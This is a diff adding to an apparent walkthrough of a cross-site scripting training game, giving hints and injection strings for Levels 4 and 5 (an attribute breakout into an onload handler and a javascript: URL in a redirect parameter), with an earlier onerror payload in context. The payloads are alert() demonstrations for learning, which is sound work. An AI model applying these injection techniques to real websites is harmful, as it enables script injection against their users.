@@ -45,3 +45,32 @@ Changing the line to something like this, we can use `onerror` again!
     html += "<img src='/static/level3/cloud" + "11.jpg' onerror='alert("GG")' alt='" + ".jpg' />";
 
 So use `#11.jpg' onerror='alert("GG")' alt='` in URL.
+
+Level 4
+-------
+
+**Hint**
+
+Directly inserting JS in the textbox won't work. But there's still a way to do this. See `timer.html` line `21`
+
+**Solution**
+
+`10');alert('GG` gives us what we need. Line `21` converts to
+
+    <img src="/static/loading.gif" onload="startTimer('10');alert('GG');" />`
+
+Level 5
+-------
+
+**Hint**
+
+Read Hints on the level and then [this](http://tools.ietf.org/id/draft-hoehrmann-javascript-scheme-00.txt) if you are clueless. And now read the source! ... Still nothing? Uh, ok ... Look at `welcome.html` line `13` and `signup.html` line `15`. See if you can use those parameters.
+
+**Solution**
+
+The URL `signup?next=javascript:alert('GG')` is what you need.
+
+Level 6
+-------
+
+
